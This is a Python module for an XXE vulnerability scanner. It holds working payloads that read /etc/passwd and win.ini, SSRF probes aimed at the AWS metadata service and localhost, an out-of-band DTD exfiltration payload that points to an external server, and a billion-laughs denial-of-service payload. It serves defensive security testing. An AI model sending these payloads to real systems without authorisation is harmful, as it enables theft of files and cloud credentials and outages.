#!/usr/bin/env python3
"""
XML External Entity (XXE) Injection vulnerability scanner.
Tests for XXE vulnerabilities that can lead to file disclosure,
SSRF, and denial of service.

References:
    - OWASP: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    - CWE-611: Improper Restriction of XML External Entity Reference
"""

import re
import base64
from typing import Dict, List, Optional
from urllib.parse import urljoin
from loguru import logger


class Scanner:
    """XML External Entity (XXE) vulnerability scanner."""
    
    def __init__(self, browser, target_url: str, config: Dict):
        """
        Initialize XXE scanner.
        
        Args:
            browser: StealthBrowser instance
            target_url: Target URL to scan
            config: Configuration dictionary
        """
        self.browser = browser
        self.target_url = target_url.rstrip('/')
        self.config = config
        self.findings = []
        self.module_name = "XML External Entity (XXE)"
        
        # XXE payloads
        self.payloads = {
            'file_read': [
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',
                
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
]>
<foo>&xxe;</foo>''',
                
                '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{server}/xxe.dtd">
  %dtd;
]>
<root>&send;</root>''',
            ],
            'ssrf': [
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>''',
                
                '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<foo>&xxe;</foo>''',
            ],
            'billion_laughs': [
                '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>''',
            ],
            'parameter_entities': [
                '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<foo>test</foo>''',
            ],
        }
        
        # Indicators of successful XXE
        self.success_indicators = [
            'root:x:0:0:',           # /etc/passwd
            '[fonts]',                # win.ini
            'ami-id',                 # AWS metadata
            'security-credentials',   # AWS IAM
            'lol',                    # Billion laughs (unlikely but checked)
        ]
        
        # Error indicators
        self.error_indicators = [
            'org.xml.sax.SAXParseException',
            'XML parser',
            'XML External Entity',
            'DOCTYPE',
            'entity reference',
            'XML syntax error',
        ]
    
    def run(self) -> Dict:
        """
        Execute XXE vulnerability tests.
        
        Returns:
            Dict with findings and test results
        """
        logger.info(f"Starting {self.module_name} scan")
        
        result = {
            'module': self.module_name,
            'endpoints_tested': [],
            'vulnerable_endpoints': [],
            'findings': []
        }
        
        # Find XML endpoints
        endpoints = self._discover_xml_endpoints()
        
        for endpoint in endpoints:
            result['endpoints_tested'].append(endpoint)
            is_vulnerable = self._test_endpoint(endpoint)
            
            if is_vulnerable:
                result['vulnerable_endpoints'].append({
                    'url': endpoint['url'],
                    'method': endpoint['method'],
                    'content_type': endpoint.get('content_type'),
                    'type': is_vulnerable['type'],
                    'evidence': is_vulnerable['evidence']
                })
        
        # Generate findings
        for vuln in result['vulnerable_endpoints']:
            self.findings.append({
                'title': f"XML External Entity (XXE) Injection at {vuln['url']}",
                'severity': 'critical' if 'file_read' in vuln['type'] else 'high',
                'description': (
                    f"XXE vulnerability detected at {vuln['url']} using {vuln['method']} method. "
                    f"Type: {vuln['type']}. This vulnerability allows an attacker to read local files, "
                    f"perform SSRF attacks, or cause denial of service."
                ),
                'recommendation': (
                    "1. Disable XML external entity processing in the XML parser\n"
                    "2. Use a modern XML parser with XXE disabled by default\n"
                    "3. Implement server-side input validation\n"
                    "4. Use JSON instead of XML where possible\n"
                    "5. Apply the principle of least privilege to file access\n"
                    "6. Keep XML processors updated to the latest version"
                ),
                'module': self.module_name,
                'cwe_id': 'CWE-611',
                'cvss_score': 9.1 if 'file_read' in vuln['type'] else 7.5,
                'evidence': vuln['evidence'],
                'references': [
                    'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
                    'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
                ]
            })
        
        result['findings'] = self.findings
        
        logger.info(f"{self.module_name} complete. Found {len(self.findings)} vulnerabilities")
        return result
    
    def _discover_xml_endpoints(self) -> List[Dict]:
        """Discover endpoints that accept XML input."""
        endpoints = []
        
        # Common XML endpoints
        xml_paths = [
            '/api/xml', '/xml', '/api/soap', '/soap',
            '/api/v1/xml', '/service', '/webservice',
            '/rpc', '/xmlrpc', '/api/rpc',
            '/upload/xml', '/import/xml',
            '/sitemap.xml', '/api/sitemap',
        ]
        
        for path in xml_paths:
            endpoints.append({
                'url': urljoin(self.target_url, path),
                'method': 'POST',
                'content_type': 'application/xml'
            })
        
        # Check forms that submit XML
        resp = self.browser.get('/')
        if resp and resp.status_code == 200:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            for form in soup.find_all('form'):
                enctype = form.get('enctype', '')
                if 'xml' in enctype.lower():
                    action = form.get('action', '')
                    method = form.get('method', 'post').upper()
                    endpoints.append({
                        'url': urljoin(self.target_url, action),
                        'method': method,
                        'content_type': 'application/xml'
                    })
        
        return endpoints[:15]
    
    def _test_endpoint(self, endpoint: Dict) -> Optional[Dict]:
        """
        Test an endpoint for XXE vulnerability.
        
        Args:
            endpoint: Endpoint info dict with url, method, content_type
        
        Returns:
            Dict with vulnerability info or None
        """
        url = endpoint['url']
        method = endpoint['method'].lower()
        
        # Test file read
        for payload in self.payloads['file_read'][:2]:
            result = self._send_xml(url, method, payload, endpoint.get('content_type'))
            if result['vulnerable']:
                return {
                    'type': 'file_read',
                    'evidence': result['evidence']
                }
        
        # Test SSRF
        for payload in self.payloads['ssrf'][:1]:
            result = self._send_xml(url, method, payload, endpoint.get('content_type'))
            if result['vulnerable']:
                return {
                    'type': 'ssrf',
                    'evidence': result['evidence']
                }
        
        # Test error-based detection
        test_xml = '<?xml version="1.0"?><test>xxe_test</test>'
        resp = None
        
        if method == 'post':
            resp = self.browser.post(url, data=test_xml)
        else:
            resp = self.browser.get(url, params={'xml': test_xml})
        
        if resp:
            for indicator in self.error_indicators:
                if indicator.lower() in resp.text.lower():
                    return {
                        'type': 'error_based',
                        'evidence': f"Response contains: {indicator}"
                    }
        
        return None
    
    def _send_xml(
        self, 
        url: str, 
        method: str, 
        xml_payload: str,
        content_type: str = 'application/xml'
    ) -> Dict:
        """
        Send XML payload and check response.
        
        Args:
            url: Target URL
            method: HTTP method
            xml_payload: XML payload string
            content_type: Content-Type header value
        
        Returns:
            Dict with 'vulnerable' bool and 'evidence' string
        """
        headers = {'Content-Type': content_type}
        
        resp = None
        if method == 'post':
            resp = self.browser.post(url, data=xml_payload)
        elif method == 'put':
            resp = self.browser.post(url, data=xml_payload)  # Fallback
        else:
            resp = self.browser.get(url, params={'xml': xml_payload})
        
        if not resp or resp.status_code == 0:
            return {'vulnerable': False, 'evidence': ''}
        
        # Check for file content indicators
        for indicator in self.success_indicators:
            if indicator in resp.text:
                return {
                    'vulnerable': True,
                    'evidence': f"Response contains system file content: '{indicator}'"
                }
        
        # Check for AWS metadata (SSRF)
        aws_indicators = ['ami-id', 'instance-id', 'public-keys/', 'security-credentials/']
        for indicator in aws_indicators:
            if indicator in resp.text:
                return {
                    'vulnerable': True,
                    'evidence': f"Response contains AWS metadata: '{indicator}'"
                }
        
        # Check for error-based XXE indicators
        error_patterns = [
            r'StartTag: invalid element name',
            r'XML Parsing Error',
            r'XML declaration not well-formed',
            r'SAXParseException',
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, resp.text, re.IGNORECASE):
                return {
                    'vulnerable': True,
                    'evidence': f"XML parsing error suggesting XXE: {pattern}"
                }
        
        # Check response time for Billion Laughs attack
        # (If response is very slow, might indicate DoS)
        
        return {'vulnerable': False, 'evidence': ''}